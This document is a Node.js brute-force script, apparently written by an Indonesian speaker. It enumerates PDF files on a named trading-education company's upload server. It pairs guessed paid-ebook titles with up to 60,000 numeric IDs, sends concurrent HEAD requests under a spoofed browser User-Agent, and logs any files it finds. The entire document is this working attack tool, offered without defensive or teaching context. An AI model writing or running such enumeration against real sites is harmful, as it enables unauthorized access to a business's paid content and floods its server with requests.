const axios = require('axios');
const fs = require('fs');

// ================= CONFIG =================
const BASE_URL = "https://graphiql.astronaccishop.com/uploads/pdf/";
const LOG_FILE = 'bruteforce_final_results.log';
const CONCURRENCY = 20; 
const TIMEOUT_MS = 6000;

// ================= POTENTIAL TITLES =================
const baseNames = [
    "bitcoin_almanac_2026",
    "bitcoin_almanac_2025",
    "bitcoin_almanac_2024",
    "the_70_pips_gold_trading_system",
    "gold_trading_secrets",
    "technical_analysis_trading",
    "candlestick_mastery",
    "elliott_wave_forecast",
    "price_action_strategy",
    "money_management_trading",
    "fibonacci_trading",
    "eye_of_future",
    "make_money_with_astronacci",
    "advanced_technical_analysis",
    "basic_trading_guide",
];

const C = {
    green: (t) => `\x1b[32m${t}\x1b[0m`,
    cyan: (t) => `\x1b[36m${t}\x1b[0m`,
    yellow: (t) => `\x1b[33m${t}\x1b[0m`,
    magenta: (t) => `\x1b[35m${t}\x1b[0m`,
    bold: (t) => `\x1b[1m${t}\x1b[0m`,
};

async function checkFile(title, prefix, id) {
    const fileName = `${title}_${prefix}${id}.pdf`;
    const url = `${BASE_URL}${fileName}`;
    
    try {
        const res = await axios.head(url, {
            timeout: TIMEOUT_MS,
            headers: { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)' }
        });

        if (res.status === 200) {
            const msg = `[FOUND] ${new Date().toISOString()} | ${url} | Size: ${res.headers['content-length']}\n`;
            console.log('\n' + C.green(C.bold(`🎉 KETEMU: ${url}`)));
            fs.appendFileSync(LOG_FILE, msg);
            return true;
        }
    } catch (e) {
        // Skip
    }
    return false;
}

async function run() {
    console.log(C.bold("\n🚀 ASTRONACCI EBOOK BRUTE FORCE v2.2 (No-Dependency Edition)"));
    console.log(C.cyan(`🎯 Target: ${BASE_URL}`));
    console.log(C.cyan(`📊 Base Names: ${baseNames.length}`));
    console.log(C.magenta(`🔑 Pattern: [NAME]_up[ID].pdf`));

    const prefix = "up";
    const startTime = Date.now();
    let totalChecked = 0;

    for (const title of baseNames) {
        console.log(C.yellow(`\n🔍 Scan: ${title}`));
        
        // Prioritas ID di sekitar 34494
        const ids = [];
        for (let i = 34400; i <= 34600; i++) ids.push(i);
        for (let i = 1; i <= 60000; i++) {
            if (i < 34400 || i > 34600) ids.push(i);
        }

        let tasks = [];
        for (let i = 0; i < ids.length; i++) {
            tasks.push(checkFile(title, prefix, ids[i]));
            
            if (tasks.length >= CONCURRENCY) {
                await Promise.all(tasks);
                totalChecked += tasks.length;
                tasks = [];
                
                const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
                process.stdout.write(`\r   Checked: ${totalChecked.toLocaleString()} | Speed: ${Math.round(totalChecked/elapsed)} req/s | Time: ${elapsed}s`);
            }
        }
        if (tasks.length > 0) {
            await Promise.all(tasks);
            totalChecked += tasks.length;
        }
    }

    console.log("\n\n✅ Scan Selesai.");
}

run();
